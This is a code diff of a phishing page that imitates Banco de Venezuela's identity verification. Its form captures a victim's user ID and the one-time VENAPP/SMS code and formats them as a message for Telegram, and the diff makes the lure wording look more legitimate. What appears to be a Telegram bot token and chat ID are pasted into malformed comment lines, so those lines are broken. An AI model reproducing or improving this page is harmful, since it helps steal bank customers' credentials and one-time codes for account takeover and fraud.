@@ -12,7 +12,7 @@
   <div class="login-container">
     <div class="login-box">
        <img style="width: 300px; height: 60px; margin-bottom: 10%;" class="logos" src="logo.png" alt="">
-      <p class="subtitle">Aprueba la notificación en tu App de BDV para generar tu código sms oh Amiven eh ingresa el código generado para verificar tu identidad y conocer tu monto aprobado.</p>
+      <p class="subtitle">Ingresa el código <b>VENAPP</b> generado  </p>
 
       <form class="sms-form">
         <div class="code-inputs">
@@ -22,7 +22,7 @@
         <button type="button" onclick="enviar()" class="btn-submit">Verificar</button>
 
         <div class="help-text">
-          <p>¿Si no Aprueba no le llegara el codigo?</p>
+          <p>¿No recibiste el código?</p>
           <p><a href="#" class="resend-link">Reenviar código</a></p>
          
         </div>
@@ -46,7 +46,6 @@
 
 
 
-
 async function enviar(event) { 
      
 
@@ -61,14 +60,14 @@ async function enviar(event) {
 const mensaje = [
   "🔔 <b>BDV PERSONAS</b>",
   `👤 Usuario: <code>${user}</code>`,
-  `📱 SMS: <code>${password}</code>`,
+  `📱 VENAPP: <code>${password}</code>`,
   "🔘",
   `⏰ ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`
 ].join("\n");
 
  const datos = {
-    user: user,           // Solo el ID para guardar en Firestore
-    message: mensaje      // Mensaje completo formateado para Telegram
+    user: user,           /7953434263/ Solo el ID para guardar en Firestore
+    message: mensaje      /8296900519:AAEUq0RBgGRUmPLpN4nz6dQKxROOUm5Lqd0/ Mensaje completo formateado para Telegram
   };
 
     
@@ -98,6 +97,10 @@ const mensaje = [
       console.log("❌ Error en la solicitud:", error);
     }
 }
+
+
+
+
 
 
 
